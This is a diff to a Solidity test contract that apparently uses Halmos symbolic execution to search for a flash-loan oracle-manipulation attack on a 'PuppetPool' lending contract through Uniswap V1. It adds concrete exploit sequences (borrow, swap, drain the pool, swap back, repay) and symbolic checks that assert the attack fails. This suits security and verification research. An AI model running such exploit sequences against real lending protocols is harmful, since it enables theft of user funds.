@@ -120,29 +120,105 @@ contract BuySellTest is Test, BlockLoader, SymTest {
 
     function testAttackGT() public {
         printBalance("Before exploit: ");
-        
+
         borrow_WETH(uniswapInitBalance);
         swap_UniswapV1_WETH_ERC20Basic(uniswapInitBalance);
         hackedAction_PuppetPool_WETH(puppetpoolInitBalance);
         swap_UniswapV1_ERC20Basic_WETH(token.balanceOf(self()));
-        payback_WETH((uniswapInitBalance * 103) / 100);
-
+        nop();
+        nop();
+        payback_WETH(uniswapInitBalance + 1 ether);
         printBalance("After exploit: ");
         require(attackGoal(), "Attack Failed!");
     }
 
-    function check_gt() public {
-        uint256 amt0 = svm.createUint256("amt0");
-        uint256 amt1 = svm.createUint256("amt1");
-        uint256 amt2 = svm.createUint256("amt2");
-        uint256 amt3 = svm.createUint256("amt3");
-        uint256 amt4 = svm.createUint256("amt4");
-        vm.assume(amt4 == (amt0 * 103 / 100));
+    function testHalmosOutput0() public {
+        // Corresponds to check_cand0, failed.
+        borrow_ERC20Basic(0x1eeb1035f37840004f);
+        swap_UniswapV1_ERC20Basic_WETH(0x1eeb1035f37840004f);
+        hackedAction_PuppetPool_WETH(0x4000200401c434000);
+        swap_UniswapV1_WETH_ERC20Basic(0x0);
+        nop();
+        swap_UniswapV1_WETH_ERC20Basic(0x1ffffffff20000000);
+        payback_ERC20Basic(0x1ef8f0eca71fa4004f);
+        assert(!attackGoal());
+        require(attackGoal(), "Attack Failed!");
+    }
+
+    function testHalmosOutput1() public {
+        // Corresponds to check_cand1, passed.
+        // It is not the best, but could prove the attacker could earn more than 1 ether.
+        borrow_WETH(0x2a3439b65f577c0200);
+        swap_UniswapV1_WETH_ERC20Basic(0x2a3439b65f577c0200);
+        hackedAction_PuppetPool_WETH(0x40400000000000001);
+        swap_UniswapV1_ERC20Basic_WETH(0x4630eef23a48084);
+        nop();
+        nop();
+        payback_WETH(0x2a3439b65f577c0200 + 1 ether);
+        printBalance("After exploit: ");
+        require(attackGoal(), "Attack Failed!");
+    }
+
+    function check_gt(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.assume(amt0 == amt1);
+        vm.assume(amt6 == amt0 + 1 ether);
         borrow_WETH(amt0);
         swap_UniswapV1_WETH_ERC20Basic(amt1);
         hackedAction_PuppetPool_WETH(amt2);
         swap_UniswapV1_ERC20Basic_WETH(amt3);
-        payback_WETH(amt4);
+        nop();
+        nop();
+        payback_WETH(amt6);
+        assert(!attackGoal());
+    }
+
+    function check_cand0(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.assume(amt0 == amt1);
+        vm.assume(amt6 == amt0 + 1 ether);
+        borrow_ERC20Basic(amt0);
+        swap_UniswapV1_ERC20Basic_WETH(amt1);
+        hackedAction_PuppetPool_WETH(amt2);
+        swap_UniswapV1_WETH_ERC20Basic(amt3);
+        nop();
+        swap_UniswapV1_WETH_ERC20Basic(amt5);
+        payback_ERC20Basic(amt6);
+        assert(!attackGoal());
+    }
+
+    function check_cand1(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.assume(amt0 == amt1);
+        vm.assume(amt6 == amt0 + 1 ether);
+        borrow_WETH(amt0);
+        swap_UniswapV1_WETH_ERC20Basic(amt1);
+        hackedAction_PuppetPool_WETH(amt2);
+        swap_UniswapV1_ERC20Basic_WETH(amt3);
+        nop();
+        nop();
+        payback_WETH(amt6);
         assert(!attackGoal());
     }
 
